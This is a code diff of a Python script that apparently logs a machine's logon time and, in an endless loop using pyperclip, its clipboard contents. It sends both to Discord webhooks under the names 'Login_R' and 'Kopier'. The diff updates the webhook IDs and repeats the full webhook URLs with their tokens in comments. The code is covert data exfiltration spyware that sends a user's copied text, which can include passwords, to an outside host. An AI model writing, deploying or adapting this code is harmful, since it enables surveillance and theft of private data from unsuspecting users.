@@ -23,11 +23,12 @@ Logon: `{time.ctime() + f" [{time.time()}]"}`
 '''
 
 bot = {"content": cont,
-		"username": "Login",
+		"username": "Login_R",
 		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/959858917830168616/unknown.png',
 		"tts": "false"}
-ping = requests.post('https://discord.com/api/webhooks/953679426632187904/H-1MG3mxQjnPphYjZKtj6HwlCil_pSob7OwcW9Ze3A011CR4BRHtBETaFY4qToHXnhVi', json=bot)
-
+hookID = "960520988494290985/jWpF62l-oED8h837f2_3kn2hr8M9Tbz1IE1Tqu74V6JtKrNlF_JB--1bpeSZLtg5nsEq"
+ping = requests.post('https://discord.com/api/webhooks/' + hookID, json=bot)
+# https://discord.com/api/webhooks/960520988494290985/jWpF62l-oED8h837f2_3kn2hr8M9Tbz1IE1Tqu74V6JtKrNlF_JB--1bpeSZLtg5nsEq
 
 try:
 	import pyperclip
@@ -44,4 +45,6 @@ while True:
 		"username": "Kopier",
 		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960113214371299388/unknown.png',
 		"tts": "false"}
-	ping = requests.post('https://discord.com/api/webhooks/960113345959178290/ITfAMUa1x0IPDvGmIdWWbLewCa6JeMLDPcftMSrMJ6PHS31PnEAsA9J9ATena3Rt-dAr', json=usrhook)
+	hookID = '960900796554297435/IuHtAXDae3UgN18lbwC4cpK_zSCgY-hi7FzFy8l_hUAt6CUpTCsWQlWE2gtwh5rRikFm'
+	ping = requests.post('https://discord.com/api/webhooks/' + hookID, json=usrhook)
+	# https://discord.com/api/webhooks/960900796554297435/IuHtAXDae3UgN18lbwC4cpK_zSCgY-hi7FzFy8l_hUAt6CUpTCsWQlWE2gtwh5rRikFm
